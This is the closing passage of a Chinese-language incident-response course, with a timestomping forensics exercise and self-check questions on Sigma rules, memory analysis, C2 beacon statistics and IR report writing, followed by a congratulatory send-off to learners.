攻擊者對 `WIN-DEVBOX01` 做了 timestomping——`C:\ProgramData\WindowsDefender\svchost32.exe` 的 $STANDARD_INFORMATION 時間被改為 2024-01-15（偽裝成系統檔案）。你能從 $FILE_NAME 屬性或 USN Journal 找出真實的建立時間嗎？對應 Ch 33。

---

## 自我檢核

做完這份 final project，你應該能回答：

- [ ] 當你看到 `Excel.exe → PowerShell.exe` 的父子進程關係，你能從哪三個不同 artifact 各自確認這件事，而不只依賴其中一個？
- [ ] Sigma 規則的 `detection` 區塊中 `selection` + `filter` + `condition` 的邏輯關係是什麼？你的規則的 FP 主要來源是什麼、如何用 `filter` 排除？
- [ ] 記憶體裡的 `malfind` 輸出不等於「一定是惡意的」，你如何從 malfind 結果進一步確認某個記憶體區域確實含有 shellcode 或注入的 DLL？
- [ ] 你計算出的 C2 beacon interval 有什麼統計意義？如何用變異係數區分「真的 beacon」和「剛好間隔相似的正常流量」？
- [ ] 在 IR 報告裡寫 Executive Summary 和寫 Timeline 有什麼本質上的不同受眾？為什麼這兩段不能互換？
- [ ] 如果你的 MTTD 是五天，你會先補哪個偵測 gap？為什麼是那個而不是其他的？

---

恭喜你走完了這門課。你從一個「只會攻擊」的工程師，補上了另一半視角——知道你的每一招在防守方眼中留下什麼痕跡、被哪個 artifact 記錄、被哪條規則偵測。這才是真正懂攻防的人。
